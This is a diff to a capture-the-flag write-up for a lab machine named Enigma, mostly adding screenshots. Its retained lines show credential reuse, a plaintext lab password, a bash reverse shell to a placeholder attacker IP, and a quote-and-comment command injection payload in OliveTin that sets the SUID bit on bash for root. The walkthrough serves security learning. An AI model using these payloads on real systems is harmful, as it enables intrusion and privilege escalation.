@@ -42,15 +42,21 @@ sudo mount -t nfs <TARGET_IP>:/srv/nfs/onboarding /<MOUNT_DIRECTORY>
 
 Browsing the mounted directory revealed a PDF named **New_Employee_Access.pdf**. The document contained onboarding information for new employees, including credentials and references to internal services.
 
+![Employee.pdf](images/Image1.png)
+
 ---
 
 ## Webmail Enumeration
 
-Using the credentials recovered from the onboarding document, we successfully authenticated to the Roundcube webmail interface as **kevin**.
+Using the credentials recovered from the onboarding document and adding the hostname to our `/etc/hosts` file, we successfully authenticated to the Roundcube webmail interface as **kevin**.
+
+![Roundcube Login](images/Image2.png)
 
 Reviewing Kevin's mailbox revealed several internal communications, including an email from **sarah@enigma.htb**. Since password reuse is a common weakness in enterprise environments, we attempted to authenticate to Sarah's mailbox using Kevin's password.
 
 The authentication succeeded, confirming credential reuse. Sarah's inbox contained another valuable email with administrator credentials for an internal OpenSTAManager instance.
+
+![Sarah's Inbox](images/Image3.png)
 
 ```text
 URL: http://support_001.enigma.htb
@@ -59,6 +65,8 @@ Password: Ne3s4rtars78s
 ```
 
 After adding the hostname to `/etc/hosts`, we successfully authenticated to the application.
+
+![OpenSTAManager Login](images/Image4.png)
 
 ---
 
@@ -134,7 +142,7 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
 
 ## User Access
 
-With an interactive shell established, the next objective was to identify credentials that could be reused to access additional services or users on the system.
+With an interactive shell established, the next objective was to identify credentials that could be used to access additional services or users on the system.
 
 Inspecting the application configuration file revealed the MySQL credentials used by OpenSTAManager.
 
@@ -209,6 +217,8 @@ http://127.0.0.1:1337
 
 presented the OliveTin web interface. The installed version (**3000.10.0**) is vulnerable to **CVE-2026-27626**, an OS Command Injection vulnerability.
 
+![OliveTin Dashboard](images/Image5.png)
+
 ### Vulnerability Overview
 
 OliveTin is vulnerable to an OS Command Injection vulnerability affecting certain actions that accept arguments of type `password`. Because user input is not properly sanitized before being passed to a shell command, an attacker can inject shell metacharacters and execute arbitrary operating system commands.
@@ -216,6 +226,8 @@ OliveTin is vulnerable to an OS Command Injection vulnerability affecting certai
 On the Enigma machine, this vulnerability is exposed through the **Backup Database** action. The `db_pass` argument is passed to the underlying shell command without sufficient sanitization. By terminating the intended argument with a single quote (`'`) and appending an arbitrary command, while commenting out the remainder of the original command using `#`, we can execute commands as the user running the OliveTin service.
 
 Since the configured backend action executes as **root**, successful exploitation results in arbitrary command execution with root privileges.
+
+![OliveTin Database Backup Action](images/Image6.png)
 
 To read the root flag directly:
 
@@ -229,7 +241,7 @@ Alternatively, we can grant the Bash binary the SUID bit:
 '; chmod +s /bin/bash #
 ```
 
-and then spawn a root shell:
+and then spawn a root shell through the ssh connection:
 
 ```bash
 /bin/bash -p
